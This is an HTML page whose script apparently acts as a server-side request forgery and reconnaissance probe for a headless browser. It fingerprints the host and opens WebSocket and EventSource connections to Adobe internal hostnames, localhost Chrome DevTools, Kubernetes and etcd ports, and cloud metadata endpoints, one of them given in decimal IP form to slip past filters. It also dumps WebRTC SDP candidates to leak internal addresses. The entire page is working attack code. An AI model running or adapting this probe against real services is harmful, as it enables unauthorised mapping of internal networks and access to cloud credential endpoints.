<html><body>
<h2>v7 WS+SDP</h2>
<pre id="r"></pre>
<script>
var R=document.getElementById('r');
function L(s){R.textContent+=s+'\n';}

function ws(url,label,to){
  to=to||1500;
  return new Promise(function(ok){
    var t=Date.now();var done=false;
    function fin(s){if(!done){done=true;L(label+': '+s+' '+(Date.now()-t)+'ms');ok();}}
    try{
      var w=new WebSocket(url);
      w.onopen=function(){L(label+': OPEN '+(Date.now()-t)+'ms');try{w.send('{"id":1,"method":"Browser.getVersion"}');}catch(e){}};
      w.onmessage=function(e){L(label+' MSG: '+(typeof e.data==='string'?e.data.substring(0,400):'[bin]'));};
      w.onerror=function(){fin('ERR');};
      w.onclose=function(e){fin('CLOSE c='+e.code);};
      setTimeout(function(){if(!done){try{w.close();}catch(e){}fin('TIMEOUT');}},to);
    }catch(e){fin(e.message);}
  });
}

(async function(){
  L('UA: '+navigator.userAgent);
  L('Cores: '+navigator.hardwareConcurrency);

  // WSS to Adobe internal (most interesting - might bypass HTTP proxy)
  L('\n== WSS Adobe ==');
  await ws('wss://senseicore-ue1.adobe.io/','sensei');
  await ws('wss://dc-argus.adobe.io/','argus');
  await ws('wss://platform-cs-jpn3.adobe.io/','platcs');
  await ws('wss://dc-genai-content-platform-v2-jpn3.adobe.io/','genai');
  await ws('wss://dc-graph-proxy.adobe.io/','graphprx');

  // WSS localhost
  L('\n== WSS local ==');
  await ws('wss://127.0.0.1:443/','lo443');
  await ws('wss://127.0.0.1:8443/','lo8443');
  await ws('wss://127.0.0.1:9222/','cdp9222');

  // WS IMDS
  L('\n== WS IMDS ==');
  await ws('ws://2852039166/','imds-dec');
  await ws('ws://169.254.169.254/','imds');
  await ws('ws://169.254.170.2/','ecs');

  // WS internal hostnames
  L('\n== WS internal ==');
  await ws('ws://127.0.0.1:10250/','kubelet');
  await ws('ws://127.0.0.1:2379/','etcd');
  await ws('ws://127.0.0.1:6443/','k8s-api');

  // EventSource
  L('\n== EventSource ==');
  await new Promise(function(ok){
    try{var es=new EventSource('http://2852039166/');es.onerror=function(){L('ES dec: ERR');es.close();ok();};es.onopen=function(){L('ES dec: OPEN');};setTimeout(function(){es.close();ok();},1500);}catch(e){L('ES: '+e.message);ok();}
  });
  await new Promise(function(ok){
    try{var es=new EventSource('http://127.0.0.1:9222/json');es.onerror=function(){L('ES cdp: ERR');es.close();ok();};es.onopen=function(){L('ES cdp: OPEN');};es.onmessage=function(e){L('ES cdp MSG: '+e.data.substring(0,200));};setTimeout(function(){es.close();ok();},1500);}catch(e){L('ES cdp: '+e.message);ok();}
  });

  // SDP full dump
  L('\n== SDP ==');
  try{
    var pc=new RTCPeerConnection({iceServers:[{urls:'stun:stun.l.google.com:19302'}]});
    pc.createDataChannel('d');
    var offer=await pc.createOffer();
    await pc.setLocalDescription(offer);
    var sdp=offer.sdp;
    var lines=sdp.split('\n');
    for(var i=0;i<lines.length;i++){
      var l=lines[i].trim();
      if(l.indexOf('c=')===0||l.indexOf('a=candidate')===0||l.indexOf('a=ice')===0||l.indexOf('a=fingerprint')===0||l.indexOf('a=setup')===0||l.indexOf('o=')===0){
        L(l);
      }
    }
  }catch(e){L('SDP: '+e.message);}

  // Busy wait at END to keep page alive
  L('\n== Waiting 5s ==');
  var start=Date.now();
  while(Date.now()-start<5000){}
  L('Done. t='+(Date.now()-start)+'ms');
  L('\n== DONE v7 ==');
})();
</script>
</body></html>
